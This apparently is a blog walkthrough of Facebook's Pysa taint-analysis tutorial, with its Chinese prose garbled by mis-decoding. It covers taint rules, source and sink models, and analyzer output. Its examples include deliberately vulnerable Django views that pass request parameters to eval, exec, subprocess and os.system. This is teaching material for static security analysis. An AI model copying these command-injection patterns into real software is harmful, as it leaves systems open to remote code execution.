    <content type="html"><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>ç”± Facebook å¼€æºçš„ <a href="https://github.com/facebook/pyre-check">Pyre</a> æ˜¯å…¼å®¹ <a href="https://www.python.org/dev/peps/pep-0484/">PEP 484</a> çš„ Python æ€§èƒ½ç±»å‹æ£€æŸ¥å™¨ï¼Œå¯ä»¥å¢é‡åˆ†æå¤§å‹ä»£ç åº“ï¼Œèƒ½å¤Ÿè¿…é€Ÿå¤„ç†ç™¾ä¸‡çº§åˆ«çš„ä»£ç ã€‚Pyre é™„å¸¦äº† Pysaï¼Œä¸€ä¸ªå…³æ³¨å®‰å…¨æ€§çš„é™æ€åˆ†æå·¥å…·ï¼ŒPysa æ˜¯ Python Static Analyzer çš„ç¼©å†™ï¼ŒPysa æ”¯æŒè¿½è¸ªå’Œåˆ†æ Python ç¨‹åºä¸­çš„æ•°æ®æµï¼ˆæ±¡ç‚¹åˆ†æï¼‰ã€‚</p><p>æ­¤å¤–è¿˜æœ‰ä¸€ä¸ª <a href="https://github.com/facebook/sapp">SAPP</a> (Static Analysis Post Processor) é™æ€åˆ†æåç½®å¤„ç†å™¨ï¼Œæä¾›å‘½ä»¤è¡Œå’Œ UI æ£€ç´¢ Pysa çš„æ‰§è¡Œç»“æœã€‚</p><p>å…³äº Python çš„ç±»å‹ï¼ˆ<a href="https://www.python.org/dev/peps/pep-0484/">PEP 484</a>ï¼‰ï¼Œå»ºè®®é˜…è¯» <a href="https://github.com/python/mypy">mypy</a> çš„ <a href="https://mypy.readthedocs.io/en/stable/cheat_sheet_py3.html">æ¸…å•</a> å’Œ <a href="https://mypy.readthedocs.io/en/stable/builtin_types.html">ç±»å‹å‚è€ƒ</a> ã€‚ä¸‹é¢å°±æ˜¯æ²¡æœ‰æ·»åŠ å’Œæ·»åŠ äº†ç±»å‹æ³¨é‡Šçš„ä¸¤ä¸ªå‡½æ•°ï¼ŒPython3.5 å¼€å§‹æ”¯æŒå¯é€‰çš„ç±»å‹æ³¨é‡Šï¼Œè¿™ä¸ªç‰¹æ€§æå¤§åœ°æ–¹ä¾¿äº†å¯¹ Python ç¨‹åºè¿›è¡Œé™æ€åˆ†æï¼Œä¸è¿‡å°±æˆ‘çœ‹åˆ°çš„å¼€æºå·¥å…·å¾ˆå°‘æœ‰æ·»åŠ ç±»å‹æ³¨é‡Šçš„â€¦</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> typing <span class="keyword">import</span> List</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">unannotated</span>():</span>        <span class="comment"># implictly returns `Any`</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">b&quot;&quot;</span> + <span class="string">&quot;&quot;</span>       <span class="comment"># function body is not checked</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">annotated</span>() -&gt; List:</span>  <span class="comment"># explicit return annotation means we type check `annotated`</span></span><br><span class="line">    <span class="built_in">any</span> = unannotated()</span><br><span class="line">    <span class="built_in">any</span>.attribute         <span class="comment"># `Any` has all possible attributes</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>              <span class="comment"># Error: returning `int` but expecting `List`</span></span><br></pre></td></tr></table></figure><p>Pysa è·Ÿè¸ªæ•°æ®æµï¼Œç”¨æˆ·å®šä¹‰æºç‚¹ï¼ˆäº§ç”Ÿæ•°æ®çš„åœ°æ–¹ï¼‰å’Œæ±‡ç‚¹ï¼ˆæ¥è‡ªæºç‚¹çš„æ•°æ®ä¸åº”è¯¥ç»“æŸçš„åœ°æ–¹ï¼‰ï¼Œå½“æºç‚¹å’Œæ±‡ç‚¹ç›¸äº¤æ—¶å°±äº§ç”Ÿäº†é—®é¢˜</p><ul><li>æœ€å¸¸è§çš„æ•°æ®æºç‚¹å°±æ˜¯ç”¨æˆ·æ§åˆ¶çš„è¾“å…¥</li><li>æ±‡ç‚¹æ¯”è¾ƒå¤šæ ·ï¼ŒåŒ…æ‹¬å„ç§ API</li></ul><img src="https://i.loli.net/2021/07/08/wNPmpHqg1WKh9Cr.jpg" width=80%><p>Pysa æ‰§è¡Œçš„æ˜¯è¿‡ç¨‹é—´åˆ†æï¼Œå³è·Ÿè¸ªè·¨å‡½æ•°è°ƒç”¨çš„æ•°æ®æµï¼ˆæ±¡ç‚¹åˆ†æï¼‰ï¼Œä½¿ç”¨ä»£ç ä¸­çš„æ‰€æœ‰å¯ç”¨ä¿¡æ¯ï¼ŒåŒ…æ‹¬å¯é€‰çš„é™æ€ç±»å‹ä¿¡æ¯ã€‚Pyre èƒ½å¤Ÿä¸ºæºç æ·»åŠ ç±»å‹ä¿¡æ¯ï¼Œå®ƒæœ¬èº«çš„ä½œç”¨å°±æ˜¯é™æ€ç±»å‹æ£€æŸ¥å™¨ã€‚</p><p>å±€é™</p><ol><li><p>é—®é¢˜ç©ºé—´</p><p> Pysa åªèƒ½è¿½è¸ªä» admin_operation åˆ° delete_user çš„æ•°æ®æµï¼Œæ— æ³•æ£€æŸ¥ user_is_admin</p> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">admin_operation</span>(<span class="params">request: HttpRequest</span>):</span></span><br><span class="line">  <span class="keyword">if</span> <span class="keyword">not</span> user_is_admin():</span><br><span class="line">      <span class="keyword">return</span> Http404</span><br><span class="line"> </span><br><span class="line">  delete_user(request.GET[<span class="string">&quot;user_to_delete&quot;</span>])</span><br></pre></td></tr></table></figure></li><li><p>Python çš„åŠ¨æ€ç‰¹æ€§</p><p> Pysa æ— æ³•è¯†åˆ«åŠ¨æ€å¯¼å…¥çš„æ¨¡å—å‡½æ•°è°ƒç”¨</p> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">secret_eval</span>(<span class="params">request: HttpRequest</span>):</span></span><br><span class="line">  os = importlib.import_module(<span class="string">&quot;os&quot;</span>)</span><br><span class="line"> </span><br><span class="line">  <span class="comment"># Pysa won&#x27;t know what &#x27;os&#x27; is, and thus won&#x27;t</span></span><br><span class="line">  <span class="comment"># catch this remote code execution issue</span></span><br><span class="line">  os.system(request.GET[<span class="string">&quot;command&quot;</span>])</span><br></pre></td></tr></table></figure></li><li><p>è£…é¥°å™¨</p><p> 2020.8.7 Facebook åšå®¢æŒ‡å‡ºæš‚ä¸æ”¯æŒåœ¨è°ƒç”¨å›¾ä¸­åŒ…æ‹¬è£…é¥°å™¨</p></li></ol><p>Facebook æä¾›äº† Pysa çš„æ•™ç¨‹ ğŸ‘‰ <a href="https://github.com/facebook/pyre-check/tree/master/documentation/pysa_tutorial">Pysa Tutorial</a> ï¼Œæ¶µç›–å‡ ä¸ªä¸»è¦çš„å†…å®¹ï¼Œè¿›è¡Œå®éªŒçš„è¿‡ç¨‹ä¸­é‡åˆ°çš„ä¸€äº›é—®é¢˜ä¹Ÿéƒ½ç£•ç£•ç»Šç»Šåœ°è§£å†³äº†ã€‚</p><h1 id="å®éªŒ"><a href="#å®éªŒ" class="headerlink" title="å®éªŒ"></a>å®éªŒ</h1><p>Pysa ä½¿ç”¨ <code>pyre analyze</code> è°ƒç”¨ï¼Œå®éªŒä¸­æ¶‰åŠåˆ°ä»¥ä¸‹å‡ ä¸ªé…ç½®æ–‡ä»¶å’Œå·¥å…·ï¼š</p><p><code>taint.config</code> </p><ul><li>å®šä¹‰æ±¡ç‚¹çš„æºï¼ˆsourceï¼‰å’Œæ±‡ï¼ˆsinkï¼‰ï¼Œè¿˜åŒ…æ‹¬éšå¼çš„æºå’Œæ±‡</li><li>æ£€æµ‹è§„åˆ™ï¼ˆruleï¼‰ï¼Œä¾‹å¦‚ï¼Œä»æŸæºç‚¹åˆ°æŸæ±‡ç‚¹æ˜¯ XXX æ”»å‡»ï¼Œä¸€æ¡è§„åˆ™ä¸­å¯ä»¥åŒ…å«å¤šä¸ªæºå’Œæ±‡</li><li>ç‰¹å¾ï¼ˆfeatureï¼‰ï¼šæ±¡ç‚¹çš„é™„åŠ å…ƒæ•°æ®ï¼Œå¯ç”¨äºè¿‡æ»¤è¯¯æŠ¥</li></ul><p><code>.pysa</code> </p><ul><li>æ±¡ç‚¹æ¨¡å‹ï¼Œè¡¨ç¤ºå“ªé‡Œæ˜¯æºç‚¹å’Œæ±‡ç‚¹ï¼ˆåˆ©ç”¨ç­¾åï¼‰ï¼Œä½¿ç”¨å®Œå…¨é™å®šåï¼Œæ ¼å¼å¿…é¡»åŒ¹é… <code>.pyi</code> å­˜æ ¹æ–‡ä»¶<ul><li><code>TaintSource[SOURCE_NAME]</code> æ ‡è®°æºç‚¹</li><li><code>TaintSink[SINK_NAME]</code> æ ‡è®°æ±‡ç‚¹</li><li><code>TaintInTaintOut</code> æ ‡è®°æ±¡ç‚¹è¿›å…¥è¿›å‡ºï¼ŒæŒ‡çš„æ˜¯è¿›å…¥å‡½æ•°çš„æ±¡ç‚¹ä¼ æ’­åˆ°è¿”å›å€¼ä¸­</li><li><code>PartialSink</code> æ ‡è®°ç»„åˆæºï¼Œä½¿ç”¨è§„åˆ™åç§°</li></ul></li><li>æ¶ˆæ¯’å™¨ï¼ˆSanitizerï¼‰è¡¨ç¤ºå¯¹è±¡çš„å˜åŒ–ï¼Œç»è¿‡æ¶ˆæ¯’å™¨æ±¡ç‚¹å°±è¢«å‡€åŒ–ï¼Œä¸å†è·Ÿè¸ª<ul><li>ä½¿ç”¨è£…é¥°å™¨å£°æ˜å‡½æ•°ä¸ºæ¶ˆæ¯’å™¨</li><li>å¯ä»¥é™å®šèŒƒå›´ï¼šæºï¼ˆsourceï¼‰ã€æ±‡ï¼ˆsinkï¼‰ã€æ±¡ç‚¹è¿›æ±¡ç‚¹å‡ºï¼ˆtaint-in-taint-out, TITOï¼‰</li></ul></li></ul><p><code>.pyre_configuration</code></p><ul><li>è·¯å¾„é…ç½®ï¼šæºä»£ç ã€å­˜æ ¹æ–‡ä»¶ç­‰</li></ul><p>SAPP</p><ul><li>äº¤äº’å¼å‘½ä»¤è¡Œ</li><li>Web æœåŠ¡å™¨</li></ul><p>åŠ¨æ€ç”Ÿæˆæ±¡ç‚¹æ¨¡å‹</p><ul><li><a href="https://github.com/facebook/pyre-check/tree/master/tools/generate_taint_models">pyre-check/tools/generate_taint_models/get_*.py</a> åŒ…å«é¢„å®šä¹‰çš„ä¸€äº›ç”Ÿæˆå™¨</li><li>éµå¾ªæ¨¡å‹é¢†åŸŸç‰¹å®šè¯­è¨€ï¼ˆDomain Specific Language, DSLï¼‰</li></ul><h2 id="ç¯å¢ƒè®¾ç½®"><a href="#ç¯å¢ƒè®¾ç½®" class="headerlink" title="ç¯å¢ƒè®¾ç½®"></a>ç¯å¢ƒè®¾ç½®</h2><p>å®éªŒç¯å¢ƒï¼š Ubuntu 20.04 Server + Python 3.8.10 + pip 20.0.2</p><p>åœ¨ Python è™šæ‹Ÿç¯å¢ƒä¸­è¿›è¡Œå®éªŒ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ä¸‹è½½æºç </span></span><br><span class="line">git <span class="built_in">clone</span> https://github.com/facebook/pyre-check.git</span><br><span class="line"><span class="built_in">cd</span> pyre-check</span><br><span class="line"></span><br><span class="line"><span class="comment"># å®‰è£…è™šæ‹Ÿç¯å¢ƒ</span></span><br><span class="line"><span class="built_in">cd</span> documentation/pysa_tutorial</span><br><span class="line">python -m venv tutorial</span><br><span class="line"></span><br><span class="line"><span class="comment"># æ¿€æ´»è™šæ‹Ÿç¯å¢ƒ</span></span><br><span class="line"><span class="built_in">source</span> tutorial/bin/activate</span><br><span class="line"></span><br><span class="line"><span class="comment"># å®‰è£…ä¾èµ–</span></span><br><span class="line">pip install pyre-check fb-sapp</span><br></pre></td></tr></table></figure><div class="note danger flat"><p>å¦‚æœè¿™é‡Œé‡åˆ° Error å¯ä»¥æ›´æ–°ä¸€ä¸‹å·¥å…·</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pip install wheel</span><br><span class="line">python -m pip install --upgrade setuptools</span><br></pre></td></tr></table></figure></div><h2 id="exercise1"><a href="#exercise1" class="headerlink" title="exercise1"></a>exercise1</h2><p>views.py å­˜åœ¨è¿œç¨‹ä»£ç æ‰§è¡Œï¼ˆRemote Code Execution, RCEï¼‰æ¼æ´ã€‚Pysa éœ€è¦çŸ¥é“ <code>request.GET</code> åŒ…å«ç”¨æˆ·æ§åˆ¶çš„æ•°æ®ï¼Œ<code>eval</code> å¯ä»¥æ‰§è¡Œä»£ç ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> django.http <span class="keyword">import</span> HttpRequest, HttpResponse</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">operate_on_twos</span>(<span class="params">request: HttpRequest</span>) -&gt; HttpResponse:</span></span><br><span class="line">    operator = request.GET[<span class="string">&quot;operator&quot;</span>]</span><br><span class="line">    result = <span class="built_in">eval</span>(<span class="string">f&quot;2 <span class="subst">&#123;operator&#125;</span> 2&quot;</span>)  <span class="comment"># noqa: P204</span></span><br><span class="line">    <span class="keyword">return</span> result</span><br></pre></td></tr></table></figure><p>taint.config ç¼–å†™è§„åˆ™ï¼Œå‘Šè¯‰ Pysa å½“ CustomUserControlled æºç‚¹æ•°æ®åˆ°è¾¾ CodeExecution æ±‡ç‚¹æ—¶ä¼šå¼•å‘ RCE ã€‚</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">&quot;sources&quot;</span>: [</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;CustomUserControlled&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;comment&quot;</span>: <span class="string">&quot;use to annotate user input&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">  ],</span><br><span class="line"></span><br><span class="line">  <span class="attr">&quot;sinks&quot;</span>: [</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;CodeExecution&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;comment&quot;</span>: <span class="string">&quot;use to annotate execution of python code&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">  ],</span><br><span class="line"></span><br><span class="line">  <span class="attr">&quot;features&quot;</span>: [],</span><br><span class="line"></span><br><span class="line">  <span class="attr">&quot;rules&quot;</span>: [</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;Possible RCE:&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;code&quot;</span>: <span class="number">5001</span>,</span><br><span class="line">      <span class="attr">&quot;sources&quot;</span>: [ <span class="string">&quot;CustomUserControlled&quot;</span> ],</span><br><span class="line">      <span class="attr">&quot;sinks&quot;</span>: [ <span class="string">&quot;CodeExecution&quot;</span> ],</span><br><span class="line">      <span class="attr">&quot;message_format&quot;</span>: <span class="string">&quot;User specified data may reach a code execution sink&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>sources_sinks.pysa å‘Šè¯‰ Pysa <code>request.Get</code> æ˜¯ <code>CustomUserControlled</code> ç±»å‹çš„æ±¡ç‚¹æºç‚¹ <code>TaintSource</code>ï¼Œè€Œ <code>eval</code> æ˜¯ <code>CodeExecution</code> ä»£ç æ‰§è¡Œç±»å‹çš„æ±¡ç‚¹æ±‡ç‚¹ <code>TaintSink</code> ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">django.http.request.HttpRequest.GET: TaintSource[CustomUserControlled] &#x3D; ...</span><br><span class="line"></span><br><span class="line">def eval(__source: TaintSink[CodeExecution], __globals, __locals): ...</span><br></pre></td></tr></table></figure><p>.pyre_configuration é…ç½®äº†æœç´¢çš„è·¯å¾„ã€‚</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">&quot;source_directories&quot;</span>: [ <span class="comment">// æŸ¥æ‰¾æºç çš„ç›®å½•</span></span><br><span class="line">    <span class="string">&quot;.&quot;</span></span><br><span class="line">  ],</span><br><span class="line">  <span class="attr">&quot;taint_models_path&quot;</span>: [ <span class="comment">// æŸ¥æ‰¾ .pysa/taint.config æ–‡ä»¶çš„ç›®å½•</span></span><br><span class="line">    <span class="string">&quot;.&quot;</span></span><br><span class="line">  ],</span><br><span class="line">  <span class="attr">&quot;search_path&quot;</span>: [  <span class="comment">// æŸ¥æ‰¾å­˜æ ¹æ–‡ä»¶</span></span><br><span class="line">    <span class="string">&quot;../../../stubs/&quot;</span></span><br><span class="line">  ],</span><br><span class="line">  <span class="attr">&quot;exclude&quot;</span>: [</span><br><span class="line">    <span class="string">&quot;.*/integration_test/.*&quot;</span></span><br><span class="line">  ],</span><br><span class="line">  <span class="attr">&quot;use_command_v2&quot;</span>: <span class="literal">true</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å…·ä½“çš„æ‰§è¡Œç»“æœå¦‚ä¸‹ï¼Œæœ€åè¾“å‡ºçš„ JSON æ•°ç»„ç»™å‡ºäº†é—®é¢˜åˆ—è¡¨ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">(tutorial) jck@analysis:~/pyre-check/documentation/pysa_tutorial/exercise1$ pyre analyze</span><br><span class="line">Æ› No cached overrides loaded, computing overrides...</span><br><span class="line">Æ› `google.protobuf.message.Message.ClearField` has 57 overrides, this might slow down the analysis considerably.</span><br><span class="line">Æ› `google.protobuf.message.Message.__init__` has 58 overrides, this might slow down the analysis considerably.</span><br><span class="line">Æ› `object.__eq__` has 82 overrides, this might slow down the analysis considerably.</span><br><span class="line">Æ› `object.__init__` has 754 overrides, this might slow down the analysis considerably.</span><br><span class="line">Æ› `object.__ne__` has 60 overrides, this might slow down the analysis considerably.</span><br><span class="line">Æ› `type.__call__` has 131 overrides, this might slow down the analysis considerably.</span><br><span class="line">Æ› `type.__init__` has 448 overrides, this might slow down the analysis considerably.</span><br><span class="line">Æ› `type.__new__` has 75 overrides, this might slow down the analysis considerably.</span><br><span class="line">[</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="string">&quot;line&quot;</span>: 12,</span><br><span class="line">    <span class="string">&quot;column&quot;</span>: 18,</span><br><span class="line">    <span class="string">&quot;stop_line&quot;</span>: 12,</span><br><span class="line">    <span class="string">&quot;stop_column&quot;</span>: 35,</span><br><span class="line">    <span class="string">&quot;path&quot;</span>: <span class="string">&quot;views.py&quot;</span>,</span><br><span class="line">    <span class="string">&quot;code&quot;</span>: 5001,</span><br><span class="line">    <span class="string">&quot;name&quot;</span>: <span class="string">&quot;Possible RCE:&quot;</span>,</span><br><span class="line">    <span class="string">&quot;description&quot;</span>:</span><br><span class="line">      <span class="string">&quot;Possible RCE: [5001]: User specified data may reach a code execution sink&quot;</span>,</span><br><span class="line">    <span class="string">&quot;long_description&quot;</span>:</span><br><span class="line">      <span class="string">&quot;Possible RCE: [5001]: User specified data may reach a code execution sink&quot;</span>,</span><br><span class="line">    <span class="string">&quot;concise_description&quot;</span>:</span><br><span class="line">      <span class="string">&quot;Possible RCE: [5001]: User specified data may reach a code execution sink&quot;</span>,</span><br><span class="line">    <span class="string">&quot;inference&quot;</span>: null,</span><br><span class="line">    <span class="string">&quot;define&quot;</span>: <span class="string">&quot;views.operate_on_twos&quot;</span></span><br><span class="line">  &#125;</span><br><span class="line">]</span><br></pre></td></tr></table></figure><h2 id="exercise2"><a href="#exercise2" class="headerlink" title="exercise2"></a>exercise2</h2><p>views.py ä¸‰ä¸ªå‡½æ•°éƒ½å­˜åœ¨è¿œç¨‹æ‰§è¡Œæ¼æ´ï¼Œå‰ä¸¤ä¸ªæ‰§è¡Œ python ä»£ç ï¼Œæœ€åä¸€ä¸ªæ‰§è¡Œ shell ä»£ç ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">from</span> django.http <span class="keyword">import</span> HttpRequest, HttpResponse</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">operate_on_twos</span>(<span class="params">request: HttpRequest</span>) -&gt; HttpResponse:</span></span><br><span class="line">    operator = request.POST[<span class="string">&quot;operator&quot;</span>]</span><br><span class="line">    result = <span class="built_in">eval</span>(<span class="string">f&quot;2 <span class="subst">&#123;operator&#125;</span> 2&quot;</span>)  <span class="comment"># noqa: P204</span></span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">operate_on_threes</span>(<span class="params">request: HttpRequest</span>) -&gt; HttpResponse:</span></span><br><span class="line">    operator = request.GET[<span class="string">&quot;operator&quot;</span>]</span><br><span class="line">    exec(<span class="string">f&quot;result = 3 <span class="subst">&#123;operator&#125;</span> 3&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> result  <span class="comment"># noqa: F821</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">operate_on_fours</span>(<span class="params">request: HttpRequest</span>) -&gt; HttpResponse:</span></span><br><span class="line">    operator = request.GET[<span class="string">&quot;operator&quot;</span>]</span><br><span class="line">    result = subprocess.getoutput(<span class="string">f&quot;expr 4 <span class="subst">&#123;operator&#125;</span> 4&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> result</span><br></pre></td></tr></table></figure><p>taint.config è§„åˆ™ä¸­å·²ç»æ·»åŠ äº†åç§°ä¸º <code>ShellExecution</code> çš„æ±‡ç‚¹ã€‚</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">&quot;sources&quot;</span>: [</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;CustomUserControlled&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;comment&quot;</span>: <span class="string">&quot;use to annotate user input&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">  ],</span><br><span class="line"></span><br><span class="line">  <span class="attr">&quot;sinks&quot;</span>: [</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;CodeExecution&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;comment&quot;</span>: <span class="string">&quot;use to annotate execution of python code&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;ShellExecution&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;comment&quot;</span>: <span class="string">&quot;use to annotate execution of shell scripts&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">  ],</span><br><span class="line"></span><br><span class="line">  <span class="attr">&quot;features&quot;</span>: [],</span><br><span class="line"></span><br><span class="line">  <span class="attr">&quot;rules&quot;</span>: [</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;Possible RCE:&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;code&quot;</span>: <span class="number">5001</span>,</span><br><span class="line">      <span class="attr">&quot;sources&quot;</span>: [ <span class="string">&quot;CustomUserControlled&quot;</span> ],</span><br><span class="line">      <span class="attr">&quot;sinks&quot;</span>: [ <span class="string">&quot;CodeExecution&quot;</span> ],</span><br><span class="line">      <span class="attr">&quot;message_format&quot;</span>: <span class="string">&quot;User specified data may reach a code execution sink&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨ taint.config ä¸­æ·»åŠ ä¸€ä¸ª <code>CustomUserControlled</code> æºç‚¹åˆ° <code>ShellExecution</code> æ±‡ç‚¹çš„è§„åˆ™ï¼Œå°† code å®šä¹‰ä¸º 5002 ã€‚</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&quot;rules&quot;: [</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;Possible RCE:&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;code&quot;</span>: <span class="number">5002</span>,</span><br><span class="line">    <span class="attr">&quot;sources&quot;</span>: [ <span class="string">&quot;CustomUserControlled&quot;</span> ],</span><br><span class="line">    <span class="attr">&quot;sinks&quot;</span>: [ <span class="string">&quot;ShellExecution&quot;</span> ],</span><br><span class="line">    <span class="attr">&quot;message_format&quot;</span>: <span class="string">&quot;User specified data may reach a shell execution sink&quot;</span></span><br><span class="line">  &#125;</span><br><span class="line">]</span><br></pre></td></tr></table></figure><p>sources_sinks.pysa åŒ…å«å¸¦æœ‰æ±¡ç‚¹æ³¨é‡Šçš„æ¨¡å‹ï¼Œè¿™äº›æ¨¡å‹å¿…é¡»åŒ¹é… <code>.pyi</code> å­˜æ ¹æ–‡ä»¶ä¸­çš„å­˜æ ¹æˆ–æºç ã€‚å°† <code>.pyi</code> å­˜æ ¹æˆ–æºç è½¬æ¢ä¸ºæ¨¡å‹æ—¶ï¼Œå¿…é¡»ç¡®ä¿ï¼š</p><ul><li>å‡½æ•°åä¸å˜</li><li>å‚æ•°åä¸å˜</li><li>åˆ é™¤ç±»å‹æ³¨é‡Š</li><li>å‡½æ•°æˆ–å±æ€§æ˜¯å®Œå…¨é™å®šçš„</li></ul><p>Pyre 